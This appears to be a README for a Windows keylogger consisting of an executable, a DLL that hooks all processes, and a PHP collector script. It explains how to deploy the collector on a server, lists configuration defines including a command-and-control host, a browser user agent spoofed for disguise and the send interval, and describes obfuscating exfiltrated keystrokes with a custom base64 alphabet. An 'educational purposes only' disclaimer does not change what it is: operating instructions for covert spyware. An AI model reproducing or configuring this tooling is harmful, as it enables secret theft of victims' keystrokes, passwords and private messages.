This program is for EDUCATIONAL PURPOSES ONLY.
Don't be evil.

To use, drop 'totally-legit.php' on a server that 
supports php, and create a file named 'logs.txt'.
Keystrokes will periodically remotely placed there
via POST requests. 

The first file is the main exe, the second file is
the dll file. Both are needed in order to hook all
processes outside of the main exe. 

For 'encryption?' if you want to call it that, I am 
utilizing base64 with an alternative alphabet (unicode).

Change it up if you want. In 'logger_of_keys.c', you can 
have other settings modified.

`#define USER_AGENT		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17"`
`#define CNC 			"gironsec.com"`
`#define CNC_FILE		"/totally-legit.php"`
`#define HOW_OFTEN		30000 // 300 seconds (5 mins)`

If you change the USER_AGENT in the C file, be sure to also
do so in the php file. 